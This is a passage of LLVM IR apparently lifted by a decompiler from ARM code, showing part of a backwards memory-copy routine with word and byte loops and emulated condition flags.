  %v8_dd28 = inttoptr i32 %v7_dd28 to i32*
  %v9_dd28 = load i32, i32* %v8_dd28, align 4
  store i32 %v9_dd28, i32* %ip.global-to-local, align 4
  %v10_dd28 = add i32 %v0_dd28, -16
  %v11_dd28 = inttoptr i32 %v10_dd28 to i32*
  %v12_dd28 = load i32, i32* %v11_dd28, align 4
  store i32 %v12_dd28, i32* %lr.global-to-local, align 4
  store i32 %v10_dd28, i32* %r1.global-to-local, align 4
  %v1_dd2c = add i32 %v0_dd24, -32
  %v2_dd2c = inttoptr i32 %v1_dd2c to i32*
  store i32 %v3_dd28, i32* %v2_dd2c, align 4
  %v4_dd2c = add i32 %v0_dd24, -28
  %v5_dd2c = inttoptr i32 %v4_dd2c to i32*
  %v6_dd2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_dd2c, i32* %v5_dd2c, align 4
  %v7_dd2c = add i32 %v0_dd24, -24
  %v8_dd2c = inttoptr i32 %v7_dd2c to i32*
  %v9_dd2c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_dd2c, i32* %v8_dd2c, align 4
  %v10_dd2c = add i32 %v0_dd24, -20
  %v11_dd2c = inttoptr i32 %v10_dd2c to i32*
  %v12_dd2c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_dd2c, i32* %v11_dd2c, align 4
  store i32 %v1_dd2c, i32* %r0.global-to-local, align 4
  %v0_dd30 = load i32, i32* %r2.global-to-local, align 4
  %v2_dd30 = add i32 %v0_dd30, -32
  store i32 %v2_dd30, i32* %r2.global-to-local, align 4
  %v6_dd34 = icmp slt i32 %v0_dd30, 32
  br i1 %v6_dd34, label %dec_label_pc_dd38.loopexit, label %dec_label_pc_dd20.dec_label_pc_dd20_crit_edge

dec_label_pc_dd20.dec_label_pc_dd20_crit_edge:    ; preds = %dec_label_pc_dd20
  %v0_dd20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dd20

dec_label_pc_dd38.loopexit:                       ; preds = %dec_label_pc_dd20
  %v4_dd30 = sub i32 31, %v0_dd30
  %v5_dd30 = and i32 %v4_dd30, %v0_dd30
  %v6_dd30 = icmp slt i32 %v5_dd30, 0
  %v7_dd30 = icmp slt i32 %v2_dd30, 0
  store i1 %v6_dd30, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_dd30, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_dd38

dec_label_pc_dd38:                                ; preds = %dec_label_pc_dd38.loopexit, %dec_label_pc_dd14
  %v6_dd40 = phi i32 [ %v1_dd2c, %dec_label_pc_dd38.loopexit ], [ %v0_dd2448, %dec_label_pc_dd14 ]
  %v0_dd48.pr = phi i32 [ %v2_dd30, %dec_label_pc_dd38.loopexit ], [ %v2_dd18, %dec_label_pc_dd14 ]
  %v4_dd38 = add i32 %v0_dd48.pr, 16
  %v6_dd38 = sub i32 0, %v0_dd48.pr
  %v7_dd38 = and i32 %v4_dd38, %v6_dd38
  %v8_dd38 = icmp slt i32 %v7_dd38, 0
  store i1 %v8_dd38, i1* %cpsr_v.global-to-local, align 1
  %v9_dd38 = icmp slt i32 %v4_dd38, 0
  store i1 %v9_dd38, i1* %cpsr_n.global-to-local, align 1
  %v10_dd38 = icmp eq i32 %v4_dd38, 0
  store i1 %v10_dd38, i1* %cpsr_z.global-to-local, align 1
  %v5_dd3c = icmp slt i32 %v0_dd48.pr, -16
  br i1 %v5_dd3c, label %.thread13, label %bb138

bb138:                                            ; preds = %dec_label_pc_dd38
  %v6_dd3c = load i32, i32* %r1.global-to-local, align 4
  %v7_dd3c = add i32 %v6_dd3c, -4
  %v8_dd3c = inttoptr i32 %v7_dd3c to i32*
  %v9_dd3c = load i32, i32* %v8_dd3c, align 4
  store i32 %v9_dd3c, i32* %r3.global-to-local, align 4
  %v10_dd3c = add i32 %v6_dd3c, -8
  %v11_dd3c = inttoptr i32 %v10_dd3c to i32*
  %v12_dd3c = load i32, i32* %v11_dd3c, align 4
  store i32 %v12_dd3c, i32* %r4.global-to-local, align 4
  %v13_dd3c = add i32 %v6_dd3c, -12
  %v14_dd3c = inttoptr i32 %v13_dd3c to i32*
  %v15_dd3c = load i32, i32* %v14_dd3c, align 4
  store i32 %v15_dd3c, i32* %ip.global-to-local, align 4
  %v16_dd3c = add i32 %v6_dd3c, -16
  %v17_dd3c = inttoptr i32 %v16_dd3c to i32*
  %v18_dd3c = load i32, i32* %v17_dd3c, align 4
  store i32 %v18_dd3c, i32* %lr.global-to-local, align 4
  store i32 %v16_dd3c, i32* %r1.global-to-local, align 4
  %v7_dd40 = add i32 %v6_dd40, -16
  %v8_dd40 = inttoptr i32 %v7_dd40 to i32*
  store i32 %v9_dd3c, i32* %v8_dd40, align 4
  %v10_dd40 = add i32 %v6_dd40, -12
  %v11_dd40 = inttoptr i32 %v10_dd40 to i32*
  %v12_dd40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_dd40, i32* %v11_dd40, align 4
  %v13_dd40 = add i32 %v6_dd40, -8
  %v14_dd40 = inttoptr i32 %v13_dd40 to i32*
  %v15_dd40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v15_dd40, i32* %v14_dd40, align 4
  %v16_dd40 = add i32 %v6_dd40, -4
  %v17_dd40 = inttoptr i32 %v16_dd40 to i32*
  %v18_dd40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_dd40, i32* %v17_dd40, align 4
  store i32 %v7_dd40, i32* %r0.global-to-local, align 4
  %v6_dd44 = load i32, i32* %r2.global-to-local, align 4
  %v7_dd44 = add i32 %v6_dd44, -16
  store i32 %v7_dd44, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_dd38, %bb138
  %v6_dd50 = phi i32 [ %v7_dd40, %bb138 ], [ %v6_dd40, %dec_label_pc_dd38 ]
  %v0_dd48 = phi i32 [ %v7_dd44, %bb138 ], [ %v0_dd48.pr, %dec_label_pc_dd38 ]
  %v4_dd48 = add i32 %v0_dd48, 20
  store i32 %v4_dd48, i32* %r2.global-to-local, align 4
  %v6_dd48 = sub i32 0, %v0_dd48
  %v7_dd48 = and i32 %v4_dd48, %v6_dd48
  %v8_dd48 = icmp slt i32 %v7_dd48, 0
  store i1 %v8_dd48, i1* %cpsr_v.global-to-local, align 1
  %v9_dd48 = icmp slt i32 %v4_dd48, 0
  store i1 %v9_dd48, i1* %cpsr_n.global-to-local, align 1
  %v10_dd48 = icmp eq i32 %v4_dd48, 0
  store i1 %v10_dd48, i1* %cpsr_z.global-to-local, align 1
  %v5_dd4c = icmp slt i32 %v0_dd48, -20
  br i1 %v5_dd4c, label %.thread15, label %bb139

bb139:                                            ; preds = %.thread13
  %v6_dd4c = load i32, i32* %r1.global-to-local, align 4
  %v7_dd4c = add i32 %v6_dd4c, -4
  %v8_dd4c = inttoptr i32 %v7_dd4c to i32*
  %v9_dd4c = load i32, i32* %v8_dd4c, align 4
  store i32 %v9_dd4c, i32* %r3.global-to-local, align 4
  %v10_dd4c = add i32 %v6_dd4c, -8
  %v11_dd4c = inttoptr i32 %v10_dd4c to i32*
  %v12_dd4c = load i32, i32* %v11_dd4c, align 4
  store i32 %v12_dd4c, i32* %ip.global-to-local, align 4
  %v13_dd4c = add i32 %v6_dd4c, -12
  %v14_dd4c = inttoptr i32 %v13_dd4c to i32*
  %v15_dd4c = load i32, i32* %v14_dd4c, align 4
  store i32 %v15_dd4c, i32* %lr.global-to-local, align 4
  store i32 %v13_dd4c, i32* %r1.global-to-local, align 4
  %v7_dd50 = add i32 %v6_dd50, -12
  %v8_dd50 = inttoptr i32 %v7_dd50 to i32*
  store i32 %v9_dd4c, i32* %v8_dd50, align 4
  %v10_dd50 = add i32 %v6_dd50, -8
  %v11_dd50 = inttoptr i32 %v10_dd50 to i32*
  %v12_dd50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_dd50, i32* %v11_dd50, align 4
  %v13_dd50 = add i32 %v6_dd50, -4
  %v14_dd50 = inttoptr i32 %v13_dd50 to i32*
  %v15_dd50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_dd50, i32* %v14_dd50, align 4
  store i32 %v7_dd50, i32* %r0.global-to-local, align 4
  %v6_dd54 = load i32, i32* %r2.global-to-local, align 4
  %v7_dd54 = add i32 %v6_dd54, -12
  store i32 %v7_dd54, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb139
  %v6_dd7456 = phi i32 [ %v6_dd50, %.thread13 ], [ %v7_dd50, %bb139 ]
  %v0_dd5c54 = phi i32 [ %v4_dd48, %.thread13 ], [ %v7_dd54, %bb139 ]
  %v2_dd58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_dd58, i32* @r4, align 4
  store i32 %v6_dd14, i32* @lr, align 4
  br label %dec_label_pc_dd5c

dec_label_pc_dd5c:                                ; preds = %dec_label_pc_dd0c, %.thread15
  %v7_dd6c = phi i32 [ %v0_dd2448, %dec_label_pc_dd0c ], [ %v6_dd7456, %.thread15 ]
  %v0_dd5c = phi i32 [ %v2_dd0c, %dec_label_pc_dd0c ], [ %v0_dd5c54, %.thread15 ]
  %v2_dd5c = add i32 %v0_dd5c, 8
  store i32 %v2_dd5c, i32* %r2.global-to-local, align 4
  %v4_dd5c = sub i32 0, %v0_dd5c
  %v5_dd5c = and i32 %v2_dd5c, %v4_dd5c
  %v6_dd5c = icmp slt i32 %v5_dd5c, 0
  store i1 %v6_dd5c, i1* %cpsr_v.global-to-local, align 1
  %v7_dd5c = icmp slt i32 %v2_dd5c, 0
  store i1 %v7_dd5c, i1* %cpsr_n.global-to-local, align 1
  %v8_dd5c = icmp eq i32 %v2_dd5c, 0
  store i1 %v8_dd5c, i1* %cpsr_z.global-to-local, align 1
  %v5_dd60 = icmp slt i32 %v0_dd5c, -8
  br i1 %v5_dd60, label %bb141, label %dec_label_pc_dd64

dec_label_pc_dd64:                                ; preds = %dec_label_pc_dd5c
  %v6_dd64 = add i32 %v0_dd5c, 4
  store i32 %v6_dd64, i32* %r2.global-to-local, align 4
  %v8_dd64 = sub i32 -5, %v0_dd5c
  %v9_dd64 = and i32 %v8_dd64, %v2_dd5c
  %v10_dd64 = icmp slt i32 %v9_dd64, 0
  store i1 %v10_dd64, i1* %cpsr_v.global-to-local, align 1
  %v11_dd64 = icmp slt i32 %v6_dd64, 0
  store i1 %v11_dd64, i1* %cpsr_n.global-to-local, align 1
  %v12_dd64 = icmp eq i32 %v2_dd5c, 4
  store i1 %v12_dd64, i1* %cpsr_z.global-to-local, align 1
  %v5_dd68 = icmp slt i32 %v2_dd5c, 4
  %v6_dd68 = load i32, i32* %r1.global-to-local, align 4
  %v7_dd68 = add i32 %v6_dd68, -4
  %v8_dd68 = inttoptr i32 %v7_dd68 to i32*
  %v9_dd68 = load i32, i32* %v8_dd68, align 4
  store i32 %v9_dd68, i32* %r3.global-to-local, align 4
  br i1 %v5_dd68, label %.thread19, label %bb140

.thread19:                                        ; preds = %dec_label_pc_dd64
  store i32 %v7_dd68, i32* %r1.global-to-local, align 4
  %v8_dd6c = add i32 %v7_dd6c, -4
  %v9_dd6c = inttoptr i32 %v8_dd6c to i32*
  store i32 %v9_dd68, i32* %v9_dd6c, align 4
  %v10_dd6c = load i32, i32* %r0.global-to-local, align 4
  %v11_dd6c = add i32 %v10_dd6c, -4
  store i32 %v11_dd6c, i32* %r0.global-to-local, align 4
  %v0_dd7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_dd64
  %v10_dd70 = add i32 %v6_dd68, -8
  %v11_dd70 = inttoptr i32 %v10_dd70 to i32*
  %v12_dd70 = load i32, i32* %v11_dd70, align 4
  store i32 %v12_dd70, i32* %ip.global-to-local, align 4
  store i32 %v10_dd70, i32* %r1.global-to-local, align 4
  %v7_dd74 = add i32 %v7_dd6c, -8
  %v8_dd74 = inttoptr i32 %v7_dd74 to i32*
  store i32 %v9_dd68, i32* %v8_dd74, align 4
  %v10_dd74 = add i32 %v7_dd6c, -4
  %v11_dd74 = inttoptr i32 %v10_dd74 to i32*
  %v12_dd74 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_dd74, i32* %v11_dd74, align 4
  store i32 %v7_dd74, i32* %r0.global-to-local, align 4
  %v6_dd78 = load i32, i32* %r2.global-to-local, align 4
  %v7_dd78 = add i32 %v6_dd78, -4
  store i32 %v7_dd78, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_dd5c, %dec_label_pc_dcec, %dec_label_pc_df20, %dec_label_pc_deb4, %dec_label_pc_de48, %bb140
  %v2_dd80 = phi i32 [ %v11_dd6c, %.thread19 ], [ %v0_de1831, %.thread25 ], [ %v7_dd6c, %dec_label_pc_dd5c ], [ %v2_dcf0, %dec_label_pc_dcec ], [ %v2_dd8c64, %dec_label_pc_df20 ], [ %v2_dd8c63, %dec_label_pc_deb4 ], [ %v2_dd8c62, %dec_label_pc_de48 ], [ %v7_dd74, %bb140 ]
  %v0_dd7c = phi i32 [ %v0_dd7c.pre, %.thread19 ], [ %v2_ddc0, %.thread25 ], [ %v2_dd5c, %dec_label_pc_dd5c ], [ %v2_dcf4, %dec_label_pc_dcec ], [ %v0_dd7c60, %dec_label_pc_df20 ], [ %v0_dd7c59, %dec_label_pc_deb4 ], [ %v0_dd7c58, %dec_label_pc_de48 ], [ %v7_dd78, %bb140 ]
  %v1_dd7c = add i32 %v0_dd7c, 4
  store i32 %v1_dd7c, i32* %r2.global-to-local, align 4
  %v3_dd7c = sub i32 0, %v0_dd7c
  %v4_dd7c = and i32 %v1_dd7c, %v3_dd7c
  %v5_dd7c = icmp slt i32 %v4_dd7c, 0
  store i1 %v5_dd7c, i1* %cpsr_v.global-to-local, align 1
  %v6_dd7c = icmp slt i32 %v1_dd7c, 0
  store i1 %v6_dd7c, i1* %cpsr_n.global-to-local, align 1
  %v7_dd7c = icmp eq i32 %v1_dd7c, 0
  store i1 %v7_dd7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dd7c, label %.thread122, label %bb142

bb142:                                            ; preds = %bb141
  %v1_dd84 = add i32 %v0_dd7c, 2
  %v3_dd84 = sub i32 -3, %v0_dd7c
  %v4_dd84 = and i32 %v3_dd84, %v1_dd7c
  %v5_dd84 = icmp slt i32 %v4_dd84, 0
  store i1 %v5_dd84, i1* %cpsr_v.global-to-local, align 1
  %v6_dd84 = icmp slt i32 %v1_dd84, 0
  store i1 %v6_dd84, i1* %cpsr_n.global-to-local, align 1
  %v7_dd84 = icmp eq i32 %v1_dd7c, 2
  store i1 %v7_dd84, i1* %cpsr_z.global-to-local, align 1
  %v0_dd88 = load i32, i32* %r1.global-to-local, align 4
  %v1_dd88 = add i32 %v0_dd88, -1
  %v2_dd88 = inttoptr i32 %v1_dd88 to i8*
  %v3_dd88 = load i8, i8* %v2_dd88, align 1
  %v4_dd88 = zext i8 %v3_dd88 to i32
  store i32 %v4_dd88, i32* %r3.global-to-local, align 4
  store i32 %v1_dd88, i32* %r1.global-to-local, align 4
  %v3_dd8c = add i32 %v2_dd80, -1
  %v4_dd8c = inttoptr i32 %v3_dd8c to i8*
  store i8 %v3_dd88, i8* %v4_dd8c, align 1
  %v5_dd8c = load i32, i32* %r0.global-to-local, align 4
  %v6_dd8c = add i32 %v5_dd8c, -1
  store i32 %v6_dd8c, i32* %r0.global-to-local, align 4
  %v0_dd90 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_dd90 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_dd90 = xor i1 %v0_dd90, %v1_dd90
  br i1 %v2_dd90, label %.thread121, label %bb143

bb143:                                            ; preds = %bb142
  %v3_dd90 = load i32, i32* %r1.global-to-local, align 4
  %v4_dd90 = add i32 %v3_dd90, -1
  %v5_dd90 = inttoptr i32 %v4_dd90 to i8*
  %v6_dd90 = load i8, i8* %v5_dd90, align 1
  %v7_dd90 = zext i8 %v6_dd90 to i32
  store i32 %v7_dd90, i32* %r3.global-to-local, align 4
  store i32 %v4_dd90, i32* %r1.global-to-local, align 4
  %v6_dd94 = add i32 %v5_dd8c, -2
  %v7_dd94 = inttoptr i32 %v6_dd94 to i8*
  store i8 %v6_dd90, i8* %v7_dd94, align 1
  %v8_dd94 = load i32, i32* %r0.global-to-local, align 4
  %v9_dd94 = add i32 %v8_dd94, -1
  store i32 %v9_dd94, i32* %r0.global-to-local, align 4
  %v1_dd98.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_dd98.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb142, %bb143
  %v7_dd9c = phi i32 [ %v9_dd94, %bb143 ], [ %v6_dd8c, %bb142 ]
  %v2_dd9c = phi i1 [ %v2_dd98.pre, %bb143 ], [ %v1_dd90, %bb142 ]
  %v1_dd9c = phi i1 [ %v1_dd98.pre, %bb143 ], [ %v0_dd90, %bb142 ]
  %v0_dd98 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_dd98 = xor i1 %v2_dd9c, %v1_dd9c
  %v4_dd98 = or i1 %v0_dd98, %v3_dd98
  br i1 %v4_dd98, label %.thread122, label %bb144

bb144:                                            ; preds = %.thread121
  %v5_dd98 = load i32, i32* %r1.global-to-local, align 4
  %v6_dd98 = add i32 %v5_dd98, -1
  %v7_dd98 = inttoptr i32 %v6_dd98 to i8*
  %v8_dd98 = load i8, i8* %v7_dd98, align 1
  %v9_dd98 = zext i8 %v8_dd98 to i32
  store i32 %v9_dd98, i32* %r3.global-to-local, align 4
  store i32 %v6_dd98, i32* %r1.global-to-local, align 4
  %v8_dd9c = add i32 %v7_dd9c, -1
  %v9_dd9c = inttoptr i32 %v8_dd9c to i8*
  store i8 %v8_dd98, i8* %v9_dd9c, align 1
  %v10_dd9c = load i32, i32* %r0.global-to-local, align 4
  %v11_dd9c = add i32 %v10_dd9c, -1
  store i32 %v11_dd9c, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_dda4:                                ; preds = %dec_label_pc_dcfc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_dda4 = icmp eq i32 %v1_dcfc, 1
  store i1 %v8_dda4, i1* %cpsr_n.global-to-local, align 1
  %v9_dda4 = icmp eq i32 %v1_dcfc, 2
  store i1 %v9_dda4, i1* %cpsr_z.global-to-local, align 1
  %v1_dda8 = add i32 %v2_dcec, -1
  %v2_dda8 = inttoptr i32 %v1_dda8 to i8*
  %v3_dda8 = load i8, i8* %v2_dda8, align 1
  %v4_dda8 = zext i8 %v3_dda8 to i32
  store i32 %v4_dda8, i32* %r3.global-to-local, align 4
  store i32 %v1_dda8, i32* %r1.global-to-local, align 4
  %v3_ddac = add i32 %v2_dcf0, -1
  %v4_ddac = inttoptr i32 %v3_ddac to i8*
  store i8 %v3_dda8, i8* %v4_ddac, align 1
  %v5_ddac = load i32, i32* %r0.global-to-local, align 4
  %v6_ddac = add i32 %v5_ddac, -1
  store i32 %v6_ddac, i32* %r0.global-to-local, align 4
  br i1 %v8_dda4, label %.thread25, label %bb145

bb145:                                            ; preds = %dec_label_pc_dda4
  %v6_ddb0 = load i32, i32* %r1.global-to-local, align 4
  %v7_ddb0 = add i32 %v6_ddb0, -1
  %v8_ddb0 = inttoptr i32 %v7_ddb0 to i8*
  %v9_ddb0 = load i8, i8* %v8_ddb0, align 1
  %v10_ddb0 = zext i8 %v9_ddb0 to i32
  store i32 %v10_ddb0, i32* %r3.global-to-local, align 4
  store i32 %v7_ddb0, i32* %r1.global-to-local, align 4
  %v9_ddb4 = add i32 %v5_ddac, -2
  %v10_ddb4 = inttoptr i32 %v9_ddb4 to i8*
  store i8 %v9_ddb0, i8* %v10_ddb4, align 1
  %v11_ddb4 = load i32, i32* %r0.global-to-local, align 4
  %v12_ddb4 = add i32 %v11_ddb4, -1
  store i32 %v12_ddb4, i32* %r0.global-to-local, align 4
  br i1 %v9_dda4, label %.thread25, label %bb146

bb146:                                            ; preds = %bb145
  %v8_ddb8 = load i32, i32* %r1.global-to-local, align 4
  %v9_ddb8 = add i32 %v8_ddb8, -1
  %v10_ddb8 = inttoptr i32 %v9_ddb8 to i8*
  %v11_ddb8 = load i8, i8* %v10_ddb8, align 1
  %v12_ddb8 = zext i8 %v11_ddb8 to i32
  store i32 %v12_ddb8, i32* %r3.global-to-local, align 4
  store i32 %v9_ddb8, i32* %r1.global-to-local, align 4
  %v11_ddbc = add i32 %v11_ddb4, -2
  %v12_ddbc = inttoptr i32 %v11_ddbc to i8*
  store i8 %v11_ddb8, i8* %v12_ddbc, align 1
  %v13_ddbc = load i32, i32* %r0.global-to-local, align 4
  %v14_ddbc = add i32 %v13_ddbc, -1
  store i32 %v14_ddbc, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb145, %dec_label_pc_dda4, %bb146
  %v0_de1831 = phi i32 [ %v12_ddb4, %bb145 ], [ %v6_ddac, %dec_label_pc_dda4 ], [ %v14_ddbc, %bb146 ]
  %v0_ddc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_ddc0 = load i32, i32* %ip.global-to-local, align 4
  %v2_ddc0 = sub i32 %v0_ddc0, %v1_ddc0
  store i32 %v2_ddc0, i32* %r2.global-to-local, align 4
  %v4_ddc0 = xor i32 %v1_ddc0, %v0_ddc0
  %v5_ddc0 = xor i32 %v2_ddc0, %v0_ddc0
  %v6_ddc0 = and i32 %v5_ddc0, %v4_ddc0
  %v7_ddc0 = icmp slt i32 %v6_ddc0, 0
  store i1 %v7_ddc0, i1* %cpsr_v.global-to-local, align 1
  %v8_ddc0 = icmp slt i32 %v2_ddc0, 0
  store i1 %v8_ddc0, i1* %cpsr_n.global-to-local, align 1
  %v9_ddc0 = icmp eq i32 %v0_ddc0, %v1_ddc0
  store i1 %v9_ddc0, i1* %cpsr_z.global-to-local, align 1
  %v5_ddc4 = icmp slt i32 %v0_ddc0, %v1_ddc0
  br i1 %v5_ddc4, label %bb141, label %dec_label_pc_ddc8

dec_label_pc_ddc8:                                ; preds = %.thread25
  %v0_ddc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_ddc8 = urem i32 %v0_ddc8, 4
  store i32 %v1_ddc8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_ddc8 = icmp eq i32 %v1_ddc8, 0
  store i1 %v2_ddc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ddc8, label %dec_label_pc_dd0c, label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_dd04, %dec_label_pc_ddc8
  %v0_de1830 = phi i32 [ %v2_dcf0, %dec_label_pc_dd04 ], [ %v0_de1831, %dec_label_pc_ddc8 ]
  %v0_dec4 = phi i32 [ %v2_dcf4, %dec_label_pc_dd04 ], [ %v2_ddc0, %dec_label_pc_ddc8 ]
  %v0_ddd0 = phi i32 [ %v2_dcec, %dec_label_pc_dd04 ], [ %v0_ddc8, %dec_label_pc_ddc8 ]
  %v0_ddd8 = phi i32 [ %v1_dd04, %dec_label_pc_dd04 ], [ %v1_ddc8, %dec_label_pc_ddc8 ]
  %v1_ddd0 = and i32 %v0_ddd0, -4
  store i32 %v1_ddd0, i32* %r1.global-to-local, align 4
  %v1_ddd4 = inttoptr i32 %v1_ddd0 to i32*
  %v2_ddd4 = load i32, i32* %v1_ddd4, align 4
  store i32 %v2_ddd4, i32* %r3.global-to-local, align 4
  %v7_ddd8 = icmp ult i32 %v0_ddd8, 2
  %v2_debc = add i32 %v0_dec4, -12
  %v4_debc = sub i32 11, %v0_dec4
  %v5_debc = and i32 %v4_debc, %v0_dec4
  %v6_debc = icmp slt i32 %v5_debc, 0
  store i1 %v6_debc, i1* %cpsr_v.global-to-local, align 1
  %v7_debc = icmp slt i32 %v2_debc, 0
  store i1 %v7_debc, i1* %cpsr_n.global-to-local, align 1
  %v8_debc = icmp eq i32 %v0_dec4, 12
  store i1 %v8_debc, i1* %cpsr_z.global-to-local, align 1
  %v5_dec0 = icmp slt i32 %v0_dec4, 12
  br i1 %v7_ddd8, label %dec_label_pc_debc, label %dec_label_pc_dde0

dec_label_pc_dde0:                                ; preds = %dec_label_pc_ddd0
  %v8_ddd8 = icmp eq i32 %v0_ddd8, 2
  br i1 %v8_ddd8, label %dec_label_pc_de50, label %dec_label_pc_dde4

dec_label_pc_dde4:                                ; preds = %dec_label_pc_dde0
  br i1 %v5_dec0, label %dec_label_pc_de30, label %dec_label_pc_ddec

dec_label_pc_ddec:                                ; preds = %dec_label_pc_dde4
  store i32 %v2_debc, i32* %r2.global-to-local, align 4
  %v3_ddf0 = load i32, i32* @r4, align 4
  store i32 %v3_ddf0, i32* %stack_var_-12, align 4
  %v6_ddf0 = load i32, i32* @r5, align 4
  store i32 %v6_ddf0, i32* %stack_var_-8, align 4
  %v9_ddf0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_ddf4

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_ddf4.dec_label_pc_ddf4_crit_edge, %dec_label_pc_ddec
  %v0_de18 = phi i32 [ %v1_de18, %dec_label_pc_ddf4.dec_label_pc_ddf4_crit_edge ], [ %v0_de1830, %dec_label_pc_ddec ]
  %v0_ddf8 = phi i32 [ %v0_ddf8.pre, %dec_label_pc_ddf4.dec_label_pc_ddf4_crit_edge ], [ %v1_ddd0, %dec_label_pc_ddec ]
  %v0_ddf4 = phi i32 [ %v0_ddf4.pre, %dec_label_pc_ddf4.dec_label_pc_ddf4_crit_edge ], [ %v2_ddd4, %dec_label_pc_ddec ]
  %v3_ddf4 = mul i32 %v0_ddf4, 256
  store i32 %v3_ddf4, i32* %lr.global-to-local, align 4
  %v1_ddf8 = add i32 %v0_ddf8, -4
  %v2_ddf8 = inttoptr i32 %v1_ddf8 to i32*
  %v3_ddf8 = load i32, i32* %v2_ddf8, align 4
  store i32 %v3_ddf8, i32* %r3.global-to-local, align 4
  %v4_ddf8 = add i32 %v0_ddf8, -8
  %v5_ddf8 = inttoptr i32 %v4_ddf8 to i32*
  %v6_ddf8 = load i32, i32* %v5_ddf8, align 4
  store i32 %v6_ddf8, i32* %r4.global-to-local, align 4
  %v7_ddf8 = add i32 %v0_ddf8, -12
  %v8_ddf8 = inttoptr i32 %v7_ddf8 to i32*
  %v9_ddf8 = load i32, i32* %v8_ddf8, align 4
  store i32 %v9_ddf8, i32* %r5.global-to-local, align 4
  %v10_ddf8 = add i32 %v0_ddf8, -16
  %v11_ddf8 = inttoptr i32 %v10_ddf8 to i32*
  %v12_ddf8 = load i32, i32* %v11_ddf8, align 4
  store i32 %v10_ddf8, i32* %r1.global-to-local, align 4
  %v4_ddfc = udiv i32 %v12_ddf8, 16777216
  %v5_ddfc = or i32 %v4_ddfc, %v3_ddf4
  store i32 %v5_ddfc, i32* %lr.global-to-local, align 4
  %v3_de00 = mul i32 %v12_ddf8, 256
  %v4_de04 = udiv i32 %v9_ddf8, 16777216
  %v5_de04 = or i32 %v3_de00, %v4_de04
  store i32 %v5_de04, i32* %ip.global-to-local, align 4
  %v3_de08 = mul i32 %v9_ddf8, 256
  %v4_de0c = udiv i32 %v6_ddf8, 16777216
  %v5_de0c = or i32 %v3_de08, %v4_de0c
  store i32 %v5_de0c, i32* %r5.global-to-local, align 4
  %v3_de10 = mul i32 %v6_ddf8, 256
  %v4_de14 = udiv i32 %v3_ddf8, 16777216
  %v5_de14 = or i32 %v3_de10, %v4_de14
  store i32 %v5_de14, i32* %r4.global-to-local, align 4
  %v1_de18 = add i32 %v0_de18, -16
  %v2_de18 = inttoptr i32 %v1_de18 to i32*
  store i32 %v5_de14, i32* %v2_de18, align 4
  %v4_de18 = add i32 %v0_de18, -12
  %v5_de18 = inttoptr i32 %v4_de18 to i32*
  %v6_de18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_de18, i32* %v5_de18, align 4
  %v7_de18 = add i32 %v0_de18, -8
  %v8_de18 = inttoptr i32 %v7_de18 to i32*
  %v9_de18 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_de18, i32* %v8_de18, align 4
  %v10_de18 = add i32 %v0_de18, -4
  %v11_de18 = inttoptr i32 %v10_de18 to i32*
  %v12_de18 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_de18, i32* %v11_de18, align 4
  store i32 %v1_de18, i32* %r0.global-to-local, align 4
  %v0_de1c = load i32, i32* %r2.global-to-local, align 4
  %v2_de1c = add i32 %v0_de1c, -16
  store i32 %v2_de1c, i32* %r2.global-to-local, align 4
  %v6_de20 = icmp slt i32 %v0_de1c, 16
  br i1 %v6_de20, label %dec_label_pc_de24, label %dec_label_pc_ddf4.dec_label_pc_ddf4_crit_edge

dec_label_pc_ddf4.dec_label_pc_ddf4_crit_edge:    ; preds = %dec_label_pc_ddf4
  %v0_ddf4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_ddf8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ddf4

dec_label_pc_de24:                                ; preds = %dec_label_pc_ddf4
  %v2_de24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_de24, i32* @r4, align 4
  %v5_de24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_de24, i32* @r5, align 4
  store i32 %v9_ddf0, i32* @lr, align 4
  %v2_de28 = add i32 %v0_de1c, -4
  store i32 %v2_de28, i32* %r2.global-to-local, align 4
  %v4_de28 = add i32 %v0_de1c, 2147483632
  %v5_de28 = and i32 %v2_de28, %v4_de28
  %v6_de28 = icmp slt i32 %v5_de28, 0
